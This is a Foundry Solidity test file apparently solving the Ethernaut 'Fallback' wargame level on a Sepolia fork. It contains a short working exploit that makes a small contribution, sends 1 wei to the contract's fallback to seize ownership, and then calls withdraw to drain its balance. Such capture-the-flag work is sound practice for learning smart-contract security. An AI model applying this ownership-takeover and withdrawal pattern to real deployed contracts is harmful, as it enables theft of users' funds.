// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/Ethernaut Challenge/01_Fallback.sol";

contract ContractTest01 is Test {
 
    Fallback level1 = Fallback(payable(0x27d96f33A5668B3447F21a08223bc5a42dfE697c));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("https://rpc.ankr.com/eth_sepolia"));
    }

    function testExploit1() public {
        
        level1.owner();
        level1.contributions(level1.owner());
        level1.contribute{value:0.0001 ether}();
        address(level1).call{value:1 wei}("");
        level1.owner();
        level1.withdraw();

    }

    receive() external payable {}
}